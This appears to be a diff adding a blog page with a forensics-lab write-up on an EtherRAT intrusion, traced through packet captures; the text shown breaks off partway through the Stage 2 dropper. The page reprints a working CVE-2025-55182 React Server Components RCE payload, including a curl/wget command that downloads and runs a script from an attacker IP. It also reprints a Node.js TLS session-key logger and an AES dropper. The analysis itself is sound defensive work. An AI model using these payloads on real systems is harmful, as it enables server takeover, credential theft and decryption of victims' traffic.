+            <li><a href="#stage-3-ssh-backdoor">Stage 3: SSH Backdoor</a></li>
+            <li><a href="#stage-4-interactive-shell">Stage 4: Interactive Shell</a></li>
+            <li><a href="#covering-tracks">Covering Tracks</a></li>
+          </ul>
+        </li>
+        <li><a href="#iocs"><span class="hl">IOCs</span></a></li>
+        <li><a href="#attack-timeline"><span class="hl">Attack Timeline</span></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h3 class="relative group"><span class="hl">TL;DR</span>
+    <div id="tldr" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#tldr" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>On February 10th, 2026, an attacker targeted the Maromalix web application, beginning with an Nmap decoy scan to mask their true IP. They exploited <strong>CVE-2025-55182</strong>. The initial payload downloaded a bash script (s.sh) that installed a local Node.js environment, deployed a TLS keylogger to sniff outbound traffic, and dropped an AES-256 encrypted blob. A Stage 2 JavaScript dropper decrypted this blob into <strong>EtherRAT</strong>, a sophisticated Stage 3 implant. EtherRAT uses Ethereum smart contracts as a <strong>blockchain-based C2 resolver</strong>. After querying the primary and fallback contracts via public RPC nodes, the malware resolved its active C2 to a fallback IP (<em>63.176.62.199</em>). The attacker then initiated an automated post-exploitation sequence: collecting host telemetry, exfiltrating AWS/SSH/Kube credentials, establishing persistence via five different OS mechanisms, planting an SSH backdoor, and finally updating the server&rsquo;s Next.js version to patch the vulnerability and secure their access.</p>
+
+<h3 class="relative group"><span style="color:red">Stage 0: Initial Access</span>
+    <div id="stage-0-initial-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-0-initial-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+
+<h4 class="relative group">Nmap Scan
+    <div id="nmap-scan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#nmap-scan" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>I started by identifying possible port scanning activity. I used the display filter <em>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</em>, which isolates SYN scan packets.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1436"
+    height="547"
+    src="/investigations/cdef-callmeonthechain---etherrat/image_hu_6eb71ee512b871aa.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image_hu_6eb71ee512b871aa.png 800w, /investigations/cdef-callmeonthechain---etherrat/image_hu_af92fc42288020f6.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image.png"></figure>
+</p>
+<p>In the screenshot, we can see a lot of different IP addresses scanning various ports on host <em>172.31.44.238</em>, this is likely nmap scan with -D parameter for <strong>decoy scanning</strong>. Nmap sends extra packets with spoofed source IP addresses. The target receives a flood of scan requests from various sources, making actual IP address look like just another &ldquo;random&rdquo; entry in a sea of traffic</p>
+<p>Looking at the conversations, I observed a whole group of addresses from different subnets, confirming the use of Decoys.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1154"
+    height="396"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-1_hu_b416a20c714f5ae.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-1_hu_b416a20c714f5ae.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-1.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-1.png"></figure>
+</p>
+
+<h4 class="relative group">Exploitation
+    <div id="exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#exploitation" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>I shifted my focus to the HTTP traffic and noticed that host <em>63.180.69.24</em> was connecting to the web server using the <code>python-requests/2.31.0</code> library.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1585"
+    height="305"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-2_hu_46c0f41183f60473.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-2_hu_46c0f41183f60473.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-2_hu_45ddf62d53ce9a2a.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-2.png"></figure>
+</p>
+<p>At 18:36, the same host started sending POST requests to the /login, /register, /contact, /checkout, /profile, and /dashboard pages with a test payload: <code>[{&quot;id&quot;:&quot;test&quot;}]</code>.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="932"
+    height="398"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-3_hu_f29edcd6c8570c04.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-3_hu_f29edcd6c8570c04.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-3.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-3.png"></figure>
+</p>
+<p>Then they sent a specialized payload to the <em>/login</em> page, which immediately caused a <strong>500 Internal Server Error</strong>. The command they successfully injected and ran was <code>id</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="nt">&#34;then&#34;</span><span class="p">:</span> <span class="s2">&#34;$1:__proto__:then&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nt">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;resolved_model&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nt">&#34;reason&#34;</span><span class="p">:</span> <span class="mi">-1</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="nt">&#34;value&#34;</span><span class="p">:</span> <span class="s2">&#34;{\&#34;then\&#34;: \&#34;$B0\&#34;}&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="nt">&#34;_response&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="nt">&#34;_prefix&#34;</span><span class="p">:</span> <span class="s2">&#34;var res = process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;,{&#39;timeout&#39;:300000}).toString().trim(); throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), {digest:`${res}`});&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="nt">&#34;_formData&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      <span class="nt">&#34;get&#34;</span><span class="p">:</span> <span class="s2">&#34;$1:constructor:constructor&#34;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>They used Node&rsquo;s internal <code>child_process</code> module to execute a shell command directly on the server. The 500 error response leaked the output of the <code>id</code> command back to the attacker.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1046"
+    height="441"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-4_hu_a06f961f7a5be387.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-4_hu_a06f961f7a5be387.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-4.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-4.png"></figure>
+</p>
+<p>This exploitation chain is a direct signature of <strong>CVE-2025-55182</strong>.</p>
+
+<h4 class="relative group">CVE-2025-55182
+    <div id="cve-2025-55182" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cve-2025-55182" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>CVE-2025-55182 is an unsafe deserialization critical (10/10) vulnerability in React Server Components (RSCs) that allows unauthenticated remote code execution via a single HTTP request. The vulnerability exists in the requireModule function within the react-server-dom-webpack package. It affects React 19.x and frameworks built on it, including Next.js 15.x and 16.x when using the App Router.</p>
+<p>After verifying execution, the attacker sent another payload forcing the server to download and execute a script named <code>s.sh</code> from their infrastructure (<em>63.176.62.199</em>).</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="nt">&#34;then&#34;</span><span class="p">:</span> <span class="s2">&#34;$1:__proto__:then&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nt">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;resolved_model&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nt">&#34;reason&#34;</span><span class="p">:</span> <span class="mi">-1</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="nt">&#34;value&#34;</span><span class="p">:</span> <span class="s2">&#34;{\&#34;then\&#34;: \&#34;$B0\&#34;}&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="nt">&#34;_response&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="nt">&#34;_prefix&#34;</span><span class="p">:</span> <span class="s2">&#34;var res = process.mainModule.require(&#39;child_process&#39;).execSync(&#39;while :; do (curl -sk https://63.176.62.199:443/s.sh -o ./s.sh 2&gt;/dev/null || wget -qO ./s.sh https://63.176.62.199:443/s.sh --no-check-certificate 2&gt;/dev/null) &amp;&amp; [ -s ./s.sh ] &amp;&amp; chmod +x ./s.sh &amp;&amp; (nohup ./s.sh &gt;/dev/null 2&gt;&amp;1 &amp;) &amp;&amp; break; sleep 300; done&#39;,{&#39;timeout&#39;:300000}).toString().trim(); throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), {digest:`${res}`});&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="nt">&#34;_formData&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      <span class="nt">&#34;get&#34;</span><span class="p">:</span> <span class="s2">&#34;$1:constructor:constructor&#34;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+
+<h3 class="relative group"><span style="color:red">Stage 1: Shell Script Deployment</span>
+    <div id="stage-1-shell-script-deployment" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-1-shell-script-deployment" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+
+<h4 class="relative group">s.sh analysis
+    <div id="ssh-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ssh-analysis" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The downloaded script starts by defining specific operational directories and downloading a self-contained Node.js binary:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nv">MALWARE_DIR</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$HOME</span><span class="s2">/.local/share/.05bf0e9b&#34;</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">NODE_DIR</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$MALWARE_DIR</span><span class="s2">/.4dai8ovb&#34;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">NODE_VERSION</span><span class="o">=</span><span class="s2">&#34;v20.11.0&#34;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">NODE_URL</span><span class="o">=</span><span class="s2">&#34;https://nodejs.org/dist/</span><span class="si">${</span><span class="nv">NODE_VERSION</span><span class="si">}</span><span class="s2">/node-</span><span class="si">${</span><span class="nv">NODE_VERSION</span><span class="si">}</span><span class="s2">-linux-x64.tar.xz&#34;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">mkdir -p <span class="s2">&#34;</span><span class="nv">$MALWARE_DIR</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$NODE_DIR</span><span class="s2">&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nb">cd</span> <span class="s2">&#34;</span><span class="nv">$MALWARE_DIR</span><span class="s2">&#34;</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;</span><span class="nv">$NODE_DIR</span><span class="s2">/node&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># downloads and unpack node.js</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"># ...[snip]...</span></span></span></code></pre></div></div>
+<p>We can see the malware resides in the hidden <code>&quot;$HOME/.local/share/.05bf0e9b&quot;</code> folder. It downloads its own specific Node.js runtime (v20.11.0) into <code>&quot;$HOME/.local/share/.05bf0e9b/.4dai8ovb&quot;</code> to ensure payload compatibility regardless of the victim&rsquo;s environment.</p>
+
+<h4 class="relative group">TLS Keylogger
+    <div id="tls-keylogger" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#tls-keylogger" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>After setting up the environment, it creates a <code>/tmp/.font-unix</code> folder where it stores a <code>.fontconfig</code> file. This is a malicious <strong>TLS Keylogger</strong> (Sniffer).</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">mkdir -p /tmp/.font-unix 2&gt;/dev/null
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"># Keylog preload script - hooks ALL TLS connections</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">cat &gt; /tmp/.font-unix/.fontconfig <span class="s">&lt;&lt; &#39;FCEOF&#39;
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s">const fs = require(&#39;fs&#39;),
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s">    tls = require(&#39;tls&#39;),
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s">    p = &#39;/tmp/.font-unix/.cache&#39;;
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s">const _c = tls.connect;
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="s">tls.connect = function(...a) {
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s">    const s = _c.apply(this, a);
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="s">    s.on(&#39;keylog&#39;, l =&gt; fs.appendFileSync(p, l));
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="s">    return s
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="s">};
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="s">const h = require(&#39;https&#39;),
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s">    _r = h.request;
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s">h.request = function(...a) {
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s">    const r = _r.apply(this, a);
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s">    r.on(&#39;socket&#39;, s =&gt; s.on &amp;&amp; s.on(&#39;keylog&#39;, l =&gt; fs.appendFileSync(p, l)));
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s">    return r
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="s">};
+</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="s">FCEOF</span></span></span></code></pre></div></div>
+<p>It acts as an inline TLS session key extractor. By overriding Node.js&rsquo;s native tls.connect and https.request modules, it intercepts all outbound encrypted connections made by the server. It captures the SSL/TLS master secrets triggered by the <code>keylog</code> event and appends them to a hidden file (<code>/tmp/.font-unix/.cache</code>). This allows the attacker to decrypt any secure communications originating from the compromised machine.</p>
+<p>Finally, the script drops a massive encrypted blob into <code>$HOME/.local/share/.05bf0e9b/.1d5j6rm2mg2d</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">cat &gt; <span class="s2">&#34;</span><span class="nv">$MALWARE_DIR</span><span class="s2">/.1d5j6rm2mg2d&#34;</span> <span class="s">&lt;&lt; &#39;BLOB_END&#39;
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s">2HVnlpRxwJyMF00X9WjlS...
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="s">BLOB_END</span></span></span></code></pre></div></div>
+
+<h3 class="relative group"><span style="color:red">Stage 2: JavaScript Dropper</span>
+    <div id="stage-2-javascript-dropper" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-2-javascript-dropper" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>The next part of the bash script writes and executes a Stage 2 JS dropper (.kxnzl4mtez.js). This dropper is responsible for decrypting the previous blob into the <code>.7vfgycfd01.js</code> payload. It uses AES-256 in CBC mode with a <strong>hardcoded key</strong> (a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5) and <strong>IV</strong> (d4e5f6a7b8c9d0e1).</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">cat</span> <span class="o">&gt;</span> <span class="s2">&#34;$MALWARE_DIR/.kxnzl4mtez.js&#34;</span> <span class="o">&lt;&lt;</span> <span class="s1">&#39;DROP_END&#39;</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1">// ============================================
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">// STAGE 2: JS DROPPER
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1">// Filename on victim: .kxnzl4mtez.js
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1">// ============================================
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kr">const</span> <span class="nx">MALWARE_DIR</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">).</span><span class="nx">homedir</span><span class="p">(),</span> <span class="s1">&#39;.local&#39;</span><span class="p">,</span> <span class="s1">&#39;share&#39;</span><span class="p">,</span> <span class="s1">&#39;.05bf0e9b&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kr">const</span> <span class="nx">ENCRYPTED_BLOB</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">MALWARE_DIR</span><span class="p">,</span> <span class="s1">&#39;.1d5j6rm2mg2d&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="kr">const</span> <span class="nx">DECRYPTED_IMPLANT</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">MALWARE_DIR</span><span class="p">,</span> <span class="s1">&#39;.7vfgycfd01.js&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="kr">const</span> <span class="nx">NODE_BINARY</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">MALWARE_DIR</span><span class="p">,</span> <span class="s1">&#39;.4dai8ovb&#39;</span><span class="p">,</span> <span class="s1">&#39;node&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="kr">const</span> <span class="nx">ALGORITHM</span> <span class="o">=</span> <span class="s1">&#39;aes-256-cbc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="kr">const</span> <span class="nx">KEY</span> <span class="o">=</span> <span class="s1">&#39;a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="kr">const</span> <span class="nx">IV</span> <span class="o">=</span> <span class="s1">&#39;d4e5f6a7b8c9d0e1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="kd">function</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nx">encryptedData</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="kr">const</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">KEY</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="kr">const</span> <span class="nx">iv</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">IV</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="kr">const</span> <span class="nx">decipher</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createDecipheriv</span><span class="p">(</span><span class="nx">ALGORITHM</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">iv</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="kd">let</span> <span class="nx">decrypted</span> <span class="o">=</span> <span class="nx">decipher</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">encryptedData</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">decrypted</span> <span class="o">+=</span> <span class="nx">decipher</span><span class="p">.</span><span class="kr">final</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">return</span> <span class="nx">decrypted</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">DECRYPTED_IMPLANT</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="nx">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">        
+</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">ENCRYPTED_BLOB</span><span class="p">))</span> <span class="p">{</span>
